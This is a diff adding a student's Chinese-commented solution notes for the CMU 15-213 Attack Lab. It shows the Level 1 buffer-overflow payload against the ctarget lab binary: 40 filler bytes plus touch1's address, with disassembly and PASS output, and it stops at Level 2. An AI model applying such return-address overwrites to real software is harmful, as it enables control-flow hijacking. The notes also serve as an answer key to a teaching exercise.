@@ -1,0 +1,38 @@
+# 字符串不得包含"\n"(0x0a)
+# 注意小端序
+# 下面指令将16进制输入转为字符串再输入程序
+# cat input_1.txt | ./hex2raw | ./ctarget -q
+# q参数使得能在本地运行
+
+# Level 1
+# 根据题意，这个阶段只需要将getbuf()函数返回到touch1()函数即可
+# 使用objdump -d ctarget > ctarget.asm反汇编，查找getbuf()函数
+# 注：ret后面的所有nop已省略
+
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	ret
+
+# 观察到缓冲区40个字节
+# 找到touch1()函数地址
+
+00000000004017c0 <touch1>:
+
+# 所以先填充40个字节，然后再填入touch1()函数地址即可
+# 尝试 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 c0 17 40 00 00 00 00 00
+# 成功
+
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00
+
+# level 2
